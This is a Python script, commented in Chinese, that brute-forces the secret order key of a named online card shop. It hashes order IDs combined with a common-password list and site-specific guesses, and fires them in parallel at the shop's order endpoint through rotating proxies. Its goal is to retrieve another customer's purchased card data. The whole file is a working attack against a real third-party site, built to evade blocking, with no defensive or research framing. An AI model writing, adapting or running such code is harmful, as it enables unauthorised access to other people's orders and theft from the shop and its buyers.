#!/usr/bin/env python3
"""SYS_KEY 分批爆破 — 80线程，每批 50k，自动刷新代理。"""
from __future__ import annotations

import concurrent.futures
import hashlib
import itertools
import json
import subprocess
import sys
import time
from pathlib import Path

BASE = "https://htqq.lol/shop"
OUT = Path(f"/tmp/syskey_brute_{int(time.time())}")
OUT.mkdir(exist_ok=True)
CK = str(OUT / "cookies.jar")
BATCH = 50_000
WORKERS = 60


def refresh_proxy() -> str:
    subprocess.run(["/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True)
    for line in Path("/data/config/proxy.env").read_text().splitlines():
        if line.startswith("PROXY_URL="):
            return line.split("=", 1)[1].strip()
    return ""


PX = refresh_proxy()


def warmup() -> None:
    for u in ("https://htqq.lol/", f"{BASE}/?mod=buy&cid=2&tid=2"):
        subprocess.run(
            ["curl", "-sk", "--max-time", "12", "-x", PX, "-c", CK, "-b", CK,
             "-A", "Mozilla/5.0", "-H", "Accept-Language: zh-CN",
             "-H", f"Referer: {u}", u],
            capture_output=True,
        )


def order(oid: int, skey: str) -> str:
    return subprocess.run(
        ["curl", "-sk", "--max-time", "6", "-x", PX, "-c", CK, "-b", CK,
         "-A", "Mozilla/5.0", "-H", "Accept-Language: zh-CN",
         "-H", "Referer: https://htqq.lol/shop/?mod=query",
         "-H", "X-Requested-With: XMLHttpRequest",
         "-X", "POST", "-d", f"id={oid}&skey={skey}",
         f"{BASE}/ajax.php?act=order"],
        capture_output=True, text=True,
    ).stdout


def main() -> int:
    print(f"proxy={PX[:55]}...", flush=True)
    warmup()
    gc = json.loads(
        subprocess.check_output(
            ["curl", "-sk", "--max-time", "12", "-x", PX, "-c", CK, "-b", CK,
             "-H", "Accept-Language: zh-CN", "-H", "Referer: https://htqq.lol/shop/",
             "-H", "X-Requested-With: XMLHttpRequest",
             f"{BASE}/ajax.php?act=getcount"],
            text=True,
        )
    )
    orders = int(gc["orders"])
    words = subprocess.check_output(
        ["curl", "-fsSL",
         "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt"],
        text=True,
    ).splitlines()
    extra = [
        "htqq", "htqq.lol", "faka", "rainbow", "caihong", "dujiaoka",
        "345a36b5fa7be2bdd2f1724157952938", "b0750180cd456b7d6efc2217f10226dd",
        "674", str(orders), "5814059", "18609", "htqq2026",
    ]
    words = list(dict.fromkeys(extra + [w.strip() for w in words if w.strip()]))
    ids = list(range(orders - 600, orders + 1))
    pairs = list(itertools.product(ids, words))
    print(f"orders={orders} pairs={len(pairs)}", flush=True)

    def check(pair: tuple[int, str]) -> tuple[int, str, str] | None:
        oid, w = pair
        sk = hashlib.md5(f"{oid}{w}{oid}".encode()).hexdigest()
        body = order(oid, sk)
        if '"code":0' in body or "kminfo" in body:
            return oid, w, body
        return None

    for start in range(0, len(pairs), BATCH):
        batch = pairs[start : start + BATCH]
        print(f"batch {start}-{start+len(batch)}", flush=True)
        with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as ex:
            for res in ex.map(check, batch, chunksize=200):
                if res:
                    print(f"HIT id={res[0]} key={res[1]!r}", flush=True)
                    print(res[2][:600], flush=True)
                    (OUT / "CARD.json").write_text(res[2])
                    return 0
        if start and start % 200_000 == 0:
            px_new = refresh_proxy()
            if px_new:
                globals()["PX"] = px_new
            warmup()
            print("proxy refreshed", flush=True)

    print("NO HIT", flush=True)
    return 2


if __name__ == "__main__":
    sys.exit(main())
